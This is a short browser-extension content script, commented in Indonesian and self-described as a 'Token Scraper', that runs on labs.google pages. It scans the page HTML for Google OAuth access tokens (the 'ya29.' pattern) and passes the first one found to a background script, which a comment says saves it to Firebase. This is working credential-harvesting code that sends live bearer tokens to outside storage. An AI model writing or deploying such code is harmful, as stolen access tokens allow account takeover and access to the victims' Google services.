// content.js 
// Script ini berjalan di halaman labs.google 
console.log("Token Scraper berjalan...");

// Pola Regex untuk token ya29... 
// Mencari string diawali 'ya29.' diikuti karakter alfanumerik, _, atau - 
const tokenRegex = /ya29\.[a-zA-Z0-9_\-]+/g;

function scanForToken() {
  const htmlContent = document.documentElement.outerHTML;
  const matches = htmlContent.match(tokenRegex);

  if (matches && matches.length > 0) {
    // Ambil token pertama yang ditemukan 
    const foundToken = matches[0];
    console.log("Token Ditemukan:", foundToken.substring(0, 20) + "...");

    // Kirim ke background.js untuk disimpan ke Firebase 
    chrome.runtime.sendMessage({
      action: "SAVE_TOKEN",
      payload: {
        token: foundToken,
        service: "Google Labs Flow"
      }
    }, (response) => {
      console.log("Status simpan:", response);
    });
  } else {
    console.log("Token belum ditemukan, mencoba lagi nanti...");
  }
}

// Jalankan scan saat halaman selesai loading 
window.addEventListener('load', () => {
  setTimeout(scanForToken, 2000); // Tunggu 2 detik agar konten dinamis muncul 
});
